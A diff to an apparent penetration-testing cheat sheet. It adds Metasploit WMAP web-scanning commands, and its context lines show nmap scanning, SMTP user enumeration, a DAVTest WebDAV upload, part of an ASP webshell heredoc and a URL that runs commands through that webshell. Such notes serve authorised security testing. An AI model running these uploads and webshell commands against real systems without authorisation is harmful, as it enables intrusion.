@@ -79,6 +79,33 @@ nmap -sV --version-intensity 9 --script "version and" <target>
 - **SMTP user enumeration**  
   `smtp-user-enum -t <target> -U /path/to/usernames.txt`
 
+## WMAP (Web Scanner in Metasploit)
+
+Scan web applications for common vulnerabilities using Metasploit's built-in WMAP module.
+
+```bash
+# Start Metasploit
+msfconsole
+
+# Add a target site
+wmap_sites -a http://<target-site>
+
+# List all targets
+wmap_sites -l
+
+# Crawl the web application
+wmap_run -t <target-id>
+
+# Run enabled vuln modules
+wmap_run -e
+
+# List all WMAP modules
+wmap_modules -l
+
+# Enable a specific module
+wmap_modules -e auxiliary/scanner/http/dir_scanner
+
+
 # WebDAV Discovery & Upload with DAVTest
 davtest -url http://<target>/webdav/ -methods all -upload
 
@@ -99,8 +126,12 @@ cat << 'EOF' > shell.asp
 %>
 EOF
 
+
+
+
 # Execute Webshell
 # Browse to: http://<target>/webdav/shell.asp?cmd=whoami
+
 
 ## Directory Discovery with Gobuster
 
